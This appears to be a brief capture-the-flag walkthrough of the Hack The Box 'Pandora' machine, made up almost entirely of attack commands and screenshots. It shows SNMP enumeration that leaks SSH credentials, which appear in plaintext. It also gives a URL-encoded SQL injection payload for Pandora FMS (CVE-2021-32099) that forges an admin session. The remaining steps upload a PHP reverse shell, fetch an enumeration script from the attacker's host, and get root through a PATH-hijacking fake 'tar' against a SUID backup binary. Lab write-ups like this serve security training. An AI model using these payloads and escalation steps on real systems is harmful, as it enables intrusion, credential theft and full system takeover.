```
nmap -sU -T5 10.10.11.136
snmpwalk -v 1 -c public 10.10.11.136
ssh daniel@10.10.11.136
ssh -D 9090 daniel@10.10.11.136
http://localhost/pandora_console/include/chart_generator.php?session_id=a%27%20UNION%20SELECT%20%27a%27,1,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20FROM%20tsessions_php%20WHERE%20%271%27=%271
Upload - php-reverse-shell.php
./LinEnum.sh
cat .ssh/id_rsa.pub
SUID - /usr/bin/pandora_backup
```


```
nmap -sS -sC -sV -T5 -Pn 10.10.11.136
```
![image](https://github.com/regarmulia/HTB/assets/33616880/783c0a61-c2ae-4652-a77c-8c615fa61310)


```
nmap -sU -T5 10.10.11.136
```
![image](https://github.com/regarmulia/HTB/assets/33616880/70bf96b2-f539-4e14-a866-3e1bf2fc1211)


```
snmpwalk -v 1 -c public 10.10.11.136
-u daniel -p HotelBabylon23
```
![image](https://github.com/regarmulia/HTB/assets/33616880/120ed051-63da-4d3b-927a-c419509d82c3)
![image](https://github.com/regarmulia/HTB/assets/33616880/38b03b03-c72d-4381-897e-14f64582dd2a)


```
ssh daniel@10.10.11.136
```
![image](https://github.com/regarmulia/HTB/assets/33616880/5f28a9f8-4695-4394-84c3-145547d2a320)
![image](https://github.com/regarmulia/HTB/assets/33616880/d04e878e-cdee-49f6-a281-434d4dcfccb4)


```
ssh -D 9090 daniel@10.10.11.136
```
![image](https://github.com/regarmulia/HTB/assets/33616880/857388f7-35c5-4472-9db5-3d88c6b8b6e5)
![image](https://github.com/regarmulia/HTB/assets/33616880/eba91bdb-2bca-4444-b4c9-542de52b1a69)
![image](https://github.com/regarmulia/HTB/assets/33616880/5bcddd33-ecda-4274-b889-0a4c003fd27a)


```
https://github.com/akr3ch/CVE-2021-32099
http://localhost/pandora_console/include/chart_generator.php?session_id=a%27%20UNION%20SELECT%20%27a%27,1,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20FROM%20tsessions_php%20WHERE%20%271%27=%271
```
![image](https://github.com/regarmulia/HTB/assets/33616880/22da2deb-1455-46d3-8600-243ffca070fc)


```
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
```
![image](https://github.com/regarmulia/HTB/assets/33616880/6991e767-eb7a-414c-8e21-c3a28fa6f48e)
![image](https://github.com/regarmulia/HTB/assets/33616880/51e9ef10-a301-41e7-9e9f-eb9027136b49)
![image](https://github.com/regarmulia/HTB/assets/33616880/d490962d-28bd-41a9-be4f-4c217c931446)


```
git clone https://github.com/rebootuser/LinEnum.git
python3 -m http.server 80
wget 10.10.14.2/LinEnum.sh
./LinEnum.sh
```
![image](https://github.com/regarmulia/HTB/assets/33616880/0cc90b26-5b28-45a4-9e72-783e13039117)
![image](https://github.com/regarmulia/HTB/assets/33616880/84ea311d-860d-44de-bb27-bd6f7c761cf5)


```
cat .ssh/id_rsa.pub
```
![image](https://github.com/regarmulia/HTB/assets/33616880/1921f65b-f11c-483e-af92-1ca195986c1b)


```
ssh matt@10.10.11.136
```
![image](https://github.com/regarmulia/HTB/assets/33616880/8a869095-c97f-48ed-8b60-b52de43c8a34)


```
/usr/bin/pandora_backup
echo "/bin/bash" > /tmp/tar
chmod +x /tmp/tar
echo $PATH
export PATH=/tmp:$PATH
echo $PATH
/usr/bin/pandora_backup
```
![image](https://github.com/regarmulia/HTB/assets/33616880/0c498fe5-d909-4f75-9df4-5f1701d14f48)
![image](https://github.com/regarmulia/HTB/assets/33616880/6e321060-68b7-45c0-aee4-6eac149b3465)


